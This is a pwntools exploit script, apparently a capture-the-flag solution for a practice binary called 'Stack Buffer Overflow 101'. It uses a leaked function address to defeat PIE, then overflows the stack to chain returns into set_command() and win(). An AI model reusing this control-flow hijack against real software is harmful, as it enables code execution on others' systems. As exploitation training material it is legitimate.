#!/usr/bin/env python3

from pwn import *

elf = ELF('./Stack Buffer Overflow 101')

io = elf.process()
#io = remote(HOST, PORT)
io.recvuntil(b'Address of the function win(): ')
addr_win = int(io.recvline().decode().strip(), 16)
ret_offset = int(io.recvline().decode().strip(), 16)

base_addr = addr_win - elf.symbols['win']
elf.address = base_addr

set_command = elf.symbols['set_command']

log.info('addr win(): %#x', addr_win)
log.info('base addr: %#x', base_addr)
log.info('addr set_command(): %#x', set_command)
log.info('ret offset: %#x', ret_offset)

payload = b''
payload += b'A'*ret_offset
payload += p64(set_command)
payload += p64(addr_win)
io.sendline(payload)

io.interactive()
